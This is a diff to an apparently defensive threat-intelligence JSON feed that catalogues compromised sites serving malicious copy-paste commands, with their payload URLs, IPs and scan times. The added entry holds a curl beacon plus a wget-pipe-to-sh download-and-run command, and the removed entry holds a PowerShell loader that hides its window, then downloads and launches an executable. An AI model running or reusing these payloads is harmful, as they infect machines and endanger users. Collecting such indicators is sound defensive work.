@@ -1,5 +1,31 @@
 [
   {
+    "UrlDomain": "www.isuzucorluservis.com",
+    "DeliveryUrl": [
+      "browse-login.info",
+      "script.google.com",
+      "script-six-tawny.vercel.app",
+      "2fwww.isuzucorluservis.com"
+    ],
+    "PayloadUrl": [
+      "https://script-six-tawny.vercel.app/lin",
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/win",
+      "https://script-six-tawny.vercel.app/mac"
+    ],
+    "IP": [
+      "51.254.152.145"
+    ],
+    "Related": [],
+    "Payload": "curl -sL -d \"id=c3ce6ff9-62d8-4db8-abc8-456006e2de46&location=Europe%2FAmsterdam%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww[.]isuzucorluservis[.]com%2F&os=Linux%20x86_64&lastVisitAt=2026-11-27T07%3A52%3A28.414Z&lastShellAt=2026-11-27T07%3A52%3A28.414Z\" \"https://script[.]google[.]com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec\" && wget -qO- 'https://script-six-tawny[.]vercel[.]app/lin' -L | sh",
+    "ResolvedDownloadUrl": [
+      "https://script.google.com/macros/s/AKfycbzs0vQRvI-2Bx4VUUCxUA4k64HdkiHicTmuK3y1MXAl7AgjPIWtRBZqH0v6EzzeuBaH/exec",
+      "https://script-six-tawny.vercel.app/lin"
+    ],
+    "ReportId": "cmwyoq8bi0i480omli8mkrp4k",
+    "ScannedAt": "2026-11-27T07:53:49.283000+00:00"
+  },
+  {
     "UrlDomain": "tnahub.store",
     "DeliveryUrl": [
       "secuius.com"
@@ -12918,24 +12944,5 @@
     ],
     "ReportId": "cmwkj68iz1ep40omlm1jzy3cm",
     "ScannedAt": "2026-11-17T10:09:31.888000+00:00"
-  },
-  {
-    "UrlDomain": "superbbicycle.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "77.37.53.227"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwkdyqkq1ejj0omlch1vgqva",
-    "ScannedAt": "2026-11-17T07:43:43.957000+00:00"
   }
 ]
